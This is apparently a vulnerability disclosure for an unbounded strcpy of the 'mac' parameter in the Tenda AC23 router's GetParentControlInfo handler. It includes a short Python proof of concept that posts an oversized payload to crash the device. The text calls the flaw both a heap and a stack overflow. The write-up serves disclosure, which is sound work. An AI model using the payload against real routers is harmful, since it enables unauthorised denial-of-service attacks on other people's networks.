Shenzhen Jixiang Tengda Technology Co., Ltd.-Tenda AC23 GetParentControlInfo heap overflow vulnerability

In the function GetParentControlInfo, the content obtained by the program from the parameter "mac" is passed to the heap created by the program, and then the value of the mac is copied directly into the heap s via the strcpy function. There is no size checking, so there is a stack overflow vulnerability. Attackers can easily perform denial-of-service attacks using well-crafted overflow data.

<img width="415" height="329" alt="image" src="https://github.com/user-attachments/assets/014ae279-08c8-42cb-8610-997fdbeabcee" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/GetParentControlInfo"

cookie = {"Cookie":"password=12345"}
data = {"mac": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
